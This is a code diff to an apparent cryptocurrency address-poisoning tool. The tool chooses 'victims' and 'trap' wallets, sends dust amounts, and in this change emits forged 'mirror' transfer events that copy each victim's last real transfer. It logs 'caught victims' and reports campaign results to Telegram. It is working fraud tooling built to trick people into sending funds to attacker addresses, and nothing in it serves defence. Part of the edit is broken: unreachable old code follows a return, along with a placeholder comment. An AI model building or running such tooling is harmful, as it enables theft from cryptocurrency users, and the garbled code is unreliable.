@@ -460,39 +460,126 @@ def get_token_balance(address, token_symbol):
     
 
 def choose_asset(victim, trap, preferred_asset=None, exact_amount=None, exact_asset=None):
-    # 🆕 EXACT MODE: Only use exact amount if trap can afford it
+    # 🆕 EXACT MODE: Only use the exact asset the victim sent
     if exact_amount is not None and exact_asset:
         exact_asset_upper = exact_asset.upper()
         is_supported = (exact_asset_upper == NATIVE_SYMBOL) or (exact_asset_upper in TOKEN_CONFIG)
         
         if is_supported:
-            # Check if trap has enough balance to send the exact amount
-            can_afford = False
+            # Try exact amount first
+            can_afford_exact = False
             if exact_asset_upper == NATIVE_SYMBOL:
                 trap_bal = call_with_retry(w3.eth.get_balance, trap)
                 reserve_wei = get_native_reserve_wei(CHAIN)
-                try:
-                    gas_price = w3.eth.gas_price
-                except Exception:
-                    gas_price = w3.to_wei(1, "gwei")
-                
+                try: gas_price = w3.eth.gas_price
+                except: gas_price = w3.to_wei(1, "gwei")
                 if trap_bal >= exact_amount + (21000 * gas_price) + reserve_wei:
-                    can_afford = True
+                    can_afford_exact = True
             else:
                 trap_bal = get_token_balance(trap, exact_asset_upper)
                 if trap_bal >= exact_amount:
-                    can_afford = True
+                    can_afford_exact = True
             
-            if can_afford:
-                logger.info(f"[EXACT MODE] Trap can afford {exact_amount} units of {exact_asset_upper}")
+            if can_afford_exact:
+                logger.info(f"[EXACT MODE] Trap can afford exact amount: {exact_amount} units of {exact_asset_upper}")
                 return (exact_asset_upper, exact_amount, None)
-            else:
-                # 🚨 FALLBACK: Trap can't afford exact amount, use standard dust
-                logger.info(f"[EXACT MODE] Trap cannot afford {exact_amount} units of {exact_asset_upper}. Falling back to standard dust.")
-                # Continue to normal logic below (preferred_asset fallback)
+            
+            # Try standard dust amount of the SAME asset
+            logger.info(f"[EXACT MODE] Trap cannot afford {exact_amount} of {exact_asset_upper}. Trying standard dust amount...")
+            
+            if exact_asset_upper == NATIVE_SYMBOL:
+                native_dust = DUST_AMOUNT.get(NATIVE_SYMBOL, 0)
+                reserve_wei = get_native_reserve_wei(CHAIN)
+                try: gas_price = w3.eth.gas_price
+                except: gas_price = w3.to_wei(1, "gwei")
+                if call_with_retry(w3.eth.get_balance, trap) >= native_dust + (21000 * gas_price) + reserve_wei:
+                    return (NATIVE_SYMBOL, native_dust, f"ℹ️ Sending standard {NATIVE_SYMBOL} dust instead of exact amount.")
+            elif exact_asset_upper in TOKEN_CONFIG:
+                token_dust = DUST_AMOUNT.get(exact_asset_upper, 0)
+                token_bal = get_token_balance(trap, exact_asset_upper)
+                if token_bal >= token_dust:
+                    return (exact_asset_upper, token_dust, f"ℹ️ Sending standard {exact_asset_upper} dust instead of exact amount.")
+            
+            # Cannot afford even standard dust of the target asset - FAIL instead of switching assets
+            logger.error(f"[EXACT MODE] Trap cannot afford any amount of {exact_asset_upper}. Aborting to prevent wrong asset.")
+            return (None, 0, f"❌ Trap has insufficient {exact_asset_upper} balance. Cannot send exact asset.")
+
+    # Normal logic for non-exact mode (batch operations without last transfer data)
+    victim_usdc = get_token_balance(victim, "USDC")
+    trap_usdc = get_token_balance(trap, "USDC")
     
+    victim_usdt = get_token_balance(victim, "USDT")
+    trap_usdt = get_token_balance(trap, "USDT")
+    
+    trap_native_bal = call_with_retry(w3.eth.get_balance, trap)
+    victim_native_bal = call_with_retry(w3.eth.get_balance, victim)
+    
+    force_stable = os.getenv("FORCE_STABLECOIN_DUST", "").lower() == "true"
+
+    def fmt(balance, decimals):
+        return f"{balance / (10**decimals):.6f}"
+
+    usdc_decimals = 6
+    usdc_dust = DUST_AMOUNT.get("USDC", 0)
+    usdt_decimals = 6
+    usdt_dust = DUST_AMOUNT.get("USDT", 0)
+    native_dust = DUST_AMOUNT.get(NATIVE_SYMBOL, 0)
+
+    usdc_ok = trap_usdc >= usdc_dust and (victim_usdc > 0 or force_stable)
+    usdt_ok = trap_usdt >= usdt_dust and (victim_usdt > 0 or force_stable)
+
+    pref_upper = preferred_asset.upper() if preferred_asset else None
+    
+    reserve_wei = get_native_reserve_wei(CHAIN)
+    try:
+        current_gas_price = w3.eth.gas_price
+    except Exception:
+        current_gas_price = w3.to_wei(1, "gwei")
+    
+    safe_native_threshold = native_dust + reserve_wei + (68000 * current_gas_price)
+    native_ok = trap_native_bal >= safe_native_threshold
+
+    if pref_upper == NATIVE_SYMBOL and native_ok:
+        return (NATIVE_SYMBOL, native_dust, None)
+    elif pref_upper == "USDC" and usdc_ok:
+        return ("USDC", usdc_dust, None)
+    elif pref_upper == "USDT" and usdt_ok:
+        return ("USDT", usdt_dust, None)
+
+    fallback_reason = None
+    if pref_upper == NATIVE_SYMBOL and not native_ok:
+        fallback_reason = f"preferred {NATIVE_SYMBOL} balance insufficient"
+    elif pref_upper == "USDC" and not usdc_ok:
+        fallback_reason = f"preferred USDC balance ({fmt(trap_usdc, usdc_decimals)}) below threshold"
+    elif pref_upper == "USDT" and not usdt_ok:
+        fallback_reason = f"preferred USDT balance ({fmt(trap_usdt, usdt_decimals)}) below threshold"
+
+    if usdc_ok:
+        msg = f"ℹ️ Falling back to USDC because {fallback_reason}." if fallback_reason else None
+        return ("USDC", usdc_dust, msg)
+
+    if usdt_ok:
+        msg = f"ℹ️ Falling back to USDT because {fallback_reason}." if fallback_reason else None
+        return ("USDT", usdt_dust, msg)
+
+    if native_ok:
+        msg = f"ℹ️ Falling back to {NATIVE_SYMBOL} because {fallback_reason}." if fallback_reason else None
+        return (NATIVE_SYMBOL, native_dust, msg)
+
+    reasons = []
+    if not native_ok:
+        reasons.append(f"Trap {NATIVE_SYMBOL} balance too low for dust + gas + reserve")
+    if trap_usdc < usdc_dust:
+        reasons.append(f"Trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) below threshold")
+    if trap_usdt < usdt_dust:
+        reasons.append(f"Trap USDT balance ({fmt(trap_usdt, usdt_decimals)}) below threshold")
+
+    error_msg = "❌ No suitable asset found.\nDetails:\n" + "\n".join([f"• {r}" for r in reasons])
+    return (None, 0, error_msg) 
+
     # Normal logic continues below if exact mode failed or wasn't provided...
     victim_usdc = get_token_balance(victim, "USDC")
+    # ... (rest of the function remains exactly the same)
     trap_usdc = get_token_balance(trap, "USDC")
     
     victim_usdt = get_token_balance(victim, "USDT")
@@ -1143,10 +1230,10 @@ def batch_poison(job_id=None, campaign_id=None):
                             caught.add(addr)
             logger.info(f"Loaded {len(caught)} caught victims from {CAUGHT_FILE}")
         except Exception as e:
-            logger.warning(f"Could not read caught victims file (possible race condition lock): {e}")
+            logger.warning(f"Could not read caught victims file: {e}")
 
     total = len(entries)
-    logger.info(f"Found {total} victims. Sending intelligent dust...")
+    logger.info(f"Found {total} victims. Processing with mirror events only...")
     if job_id:
         update_job(job_id, total=total)
 
@@ -1158,14 +1245,39 @@ def batch_poison(job_id=None, campaign_id=None):
 
         logger.info(f"[{i}/{total}] Processing victim {victim}")
         
-        if send_dust(key, victim, campaign_id=campaign_id):
+        trap_address = w3.eth.account.from_key(key).address.lower()
+        
+        # Fetch counterparty from DB
+        counterparty = get_counterparty_from_db(victim, campaign_id)
+        if not counterparty:
+            logger.warning(f"[{i}/{total}] No counterparty found for {victim}, skipping")
+            continue
+        
+        # Fetch last transfer from blockchain
+        logger.info(f"[mirror] Fetching last transfer from {victim} to {counterparty}...")
+        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty)
+        
+        if not fetched_asset or not fetched_amount:
+            logger.warning(f"[{i}/{total}] No transfer found for {victim}, skipping")
+            continue
+        
+        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
+        
+        # Emit FAKE mirror event (no real tokens needed)
+        tx_hash = emit_mirror_transfer(victim, trap_address, fetched_amount, fetched_asset, campaign_id)
+        
+        if tx_hash:
             success += 1
+            logger.info(f"[{i}/{total}] ✅ Mirror event emitted: {tx_hash}")
+        else:
+            logger.error(f"[{i}/{total}] ❌ Mirror emission failed")
+            
         if job_id and i % 5 == 0:
             update_job(job_id, progress=i)
         time.sleep(1)
 
     logger.info(f"Completed: {success}/{total} successful.")
-    send_telegram(f"🏁 Dust batch complete: {success}/{total} successful.", campaign_id=campaign_id)
+    send_telegram(f"🏁 Mirror batch complete: {success}/{total} successful.", campaign_id=campaign_id)
 
     if job_id:
         if success == total:
@@ -1178,11 +1290,10 @@ if __name__ == "__main__":
 
     parser = argparse.ArgumentParser()
     parser.add_argument('--job-id', help='Job ID for tracking')
-    parser.add_argument('--mirror-only', action='store_true', help='Only emit mirror event, skip real dust')
     parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
     parser.add_argument('victim_address', nargs='?', help='Victim address for single dust send')
     args = parser.parse_args()
-
+    
     job_id = args.job_id
     campaign_id = None
     if job_id:
@@ -1192,58 +1303,58 @@ if __name__ == "__main__":
         campaign_id = os.getenv('CAMPAIGN_ID')
 
     if args.private_key and args.victim_address:
-        # ─── MIRROR MODE: Fetch last transfer and emit forged event ───
-        if args.mirror_only:
-            trap_address = w3.eth.account.from_key(args.private_key).address.lower()
+        trap_address = w3.eth.account.from_key(args.private_key).address.lower()
 
-            # Get counterparty from DB
-            counterparty = get_counterparty_from_db(args.victim_address, campaign_id)
-            if not counterparty:
-                logger.error("No counterparty found, cannot determine last transfer")
-                send_telegram(f"❌ Mirror failed: No counterparty found for {args.victim_address}", campaign_id=campaign_id)
-                sys.exit(1)
+        # STEP 1: Fetch last transfer from blockchain
+        counterparty = get_counterparty_from_db(args.victim_address, campaign_id)
+        if not counterparty:
+            error_msg = f"❌ Mirror failed: No counterparty found for {args.victim_address}"
+            logger.error(error_msg)
+            send_telegram(error_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='failed', message='No counterparty found')
+            sys.exit(1)
 
-            # Fetch last transfer from blockchain
-            logger.info(f"[mirror] Fetching last transfer from {args.victim_address} to {counterparty}...")
-            fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(args.victim_address, counterparty)
+        logger.info(f"[mirror] Fetching last transfer from {args.victim_address} to {counterparty}...")
+        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(args.victim_address, counterparty)
 
-            if not fetched_asset or not fetched_amount:
-                logger.error("No last transfer found on blockchain")
-                send_telegram(f"❌ Mirror failed: No transfer found from {args.victim_address} to {counterparty}", campaign_id=campaign_id)
-                sys.exit(1)
+        if not fetched_asset or not fetched_amount:
+            error_msg = f"❌ Mirror failed: No transfer found from {args.victim_address} to {counterparty}"
+            logger.error(error_msg)
+            send_telegram(error_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='failed', message='No transfer found')
+            sys.exit(1)
 
-            logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
+        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
 
-            # Emit forged transfer via MirrorToken
-            tx_hash = emit_mirror_transfer(args.victim_address, trap_address, fetched_amount, fetched_asset, campaign_id)
+        # STEP 2: Emit FAKE mirror event (no real tokens needed)
+        tx_hash = emit_mirror_transfer(args.victim_address, trap_address, fetched_amount, fetched_asset, campaign_id)
 
-            if tx_hash:
-                try:
-                    decimals = config.get_token_decimals().get(fetched_asset, 6) if hasattr(config, 'get_token_decimals') else 6
-                except AttributeError:
-                    decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6
+        if tx_hash:
+            try:
+                decimals = config.get_token_decimals().get(fetched_asset, 6) if hasattr(config, 'get_token_decimals') else 6
+            except AttributeError:
+                decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6
 
-                amount_display = fetched_amount / (10 ** decimals)
-                send_telegram(
-                    f"🪞 Mirror emitted successfully!\n"
-                    f"Victim: {args.victim_address}\n"
-                    f"Trap: {trap_address}\n"
-                    f"Amount: {amount_display:.6f} {fetched_asset}\n"
-                    f"TX: {tx_hash}",
-                    campaign_id=campaign_id
-                )
-                if job_id:
-                    update_job(job_id, status='completed', progress=1, message='Mirror emitted')
-            else:
-                send_telegram(f"❌ Mirror emission failed for {args.victim_address}", campaign_id=campaign_id)
-                if job_id:
-                    update_job(job_id, status='failed', message='Mirror emission failed')
-                sys.exit(1)
-
+            amount_display = fetched_amount / (10 ** decimals)
+            success_msg = (
+                f"🪞 Mirror event emitted!\n"
+                f"Victim: {args.victim_address}\n"
+                f"Trap: {trap_address}\n"
+                f"Amount: {amount_display:.6f} {fetched_asset}\n"
+                f"TX: {tx_hash}"
+            )
+            logger.info(success_msg)
+            send_telegram(success_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='completed', progress=1, message='Mirror emitted')
         else:
-            # Normal dust mode (existing behavior)
-            success = send_dust(args.private_key, args.victim_address, campaign_id=campaign_id)
-            if not success:
-                sys.exit(1)
+            error_msg = f"❌ Mirror emission failed for {args.victim_address}"
+            logger.error(error_msg)
+            send_telegram(error_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='failed', message='Mirror emission failed')
+            sys.exit(1)
     else:
         batch_poison(job_id=job_id, campaign_id=campaign_id)
